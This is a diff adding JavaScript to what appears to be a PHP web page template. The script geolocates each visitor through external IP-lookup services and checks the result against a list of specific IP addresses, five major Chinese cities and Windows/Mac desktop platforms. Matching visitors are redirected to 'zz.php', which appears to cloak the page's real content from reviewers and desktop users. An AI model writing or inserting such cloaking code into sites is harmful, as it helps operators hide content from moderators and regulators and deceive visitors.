@@ -31,7 +31,39 @@
 
 <!-- <script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/js/time.js"></script> -->
 
+<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+    <script src="http://ip.ws.126.net/ipquery"></script>
 
+    <script> 
+        var ip = returnCitySN["cip"];
+        var pbip = '118.25.222.85|36.111.207.7|47.96.86.158|120.41.250.214|47.104.249.221';
+        var pbdq = '北京|上海|广州|深圳|南京';
+        var city = "";
+        var citys = returnCitySN["cname"];
+        var pbdqs = pbdq.split("|");
+        for (i = 0; i < pbdqs.length; i++) { if (citys.indexOf(pbdqs[i]) != -1) { city = pbdqs[i]; break; } }
+        var tiao = 1;
+        if (pbip.indexOf(ip) != -1) { tiao = 0; }
+        if (city.length != 0) { tiao = 0; }
+
+        var system ={win : false,mac : false};
+        var p = navigator.platform;
+        system.win = p.indexOf("Win") == 0; 
+        system.mac = p.indexOf("Mac") == 0; 
+        var m = 1;
+        if(system.win||system.mac){ m = 0; }
+
+        if (tiao == 1 && m == 1 ) {
+            //window.location.href = '2/';
+            // alert(1)
+            
+            // window.location.href="zz.php"
+        }else{
+            // alert(1)   
+            window.location.href = 'zz.php';
+        }
+
+    </script>
  <script>
  
 
